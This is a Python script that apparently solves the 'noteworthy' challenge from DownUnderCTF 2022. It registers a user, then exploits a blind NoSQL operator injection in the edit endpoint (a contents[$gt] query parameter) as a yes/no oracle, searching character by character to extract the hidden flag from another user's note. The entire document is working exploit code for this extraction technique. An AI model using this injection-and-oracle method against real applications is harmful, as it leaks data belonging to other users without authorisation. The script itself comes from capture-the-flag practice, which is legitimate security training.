from requests import Session
from random import randint
from string import printable
charset = sorted(printable)[6:]

def register_user(username, password):
    r = session.post(f'{url}/register', json={'username': username, 'password': password})

# returns True if the note exists
def oracle(q):
    r = session.get(f'{url}/edit?noteId=1337&contents[$gt]={q}')
    return 'You are not the owner of this note!' in r.text

url = 'https://web-noteworthy-873b7c844f49.2022.ductf.dev'
session = Session()
register_user(f'solve-{randint(1, 10000)}', 'solve')

flag = ''
while flag[-1:] != '}':
    l = 0
    u = len(charset)
    while True:
        m = (l + u) // 2
        
        candidate = flag + charset[m]
        if oracle(candidate):
            if not oracle(flag + charset[m+1]):
                if charset[m+1] == '}':
                    flag = flag + charset[m+1]
                else:
                    flag = candidate
                print(flag)
                break
            l = m - 1
        else:
            u = m + 1
